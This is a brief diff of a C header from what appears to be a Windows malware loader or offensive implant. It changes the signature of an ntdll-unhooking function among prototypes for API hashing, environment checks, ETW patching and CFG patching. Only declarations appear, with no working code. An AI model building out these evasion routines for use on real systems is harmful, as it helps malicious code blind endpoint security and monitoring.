@@ -100,7 +100,7 @@ ULONG_PTR InvokeSpoofedApi(DWORD64 apiHash, UINT64 argCount, ...);
 --------------------------------------------------------------------*/
 BOOL Payload();
 BOOL CheckEnvironment();
-BOOL UnhookNtdll(PVX_TABLE pVxTable);
+BOOL UnhookNtdll(PVX_TABLE pVxTable, PCWSTR wszDllName, PVOID pTargetModuleBase);
 BOOL IsNtdllTainted(PVX_TABLE pVxTable);
 BOOL PatchEtw(PVX_TABLE pVxTable);
 BOOL PatchCFG(PVX_TABLE pVxTable);
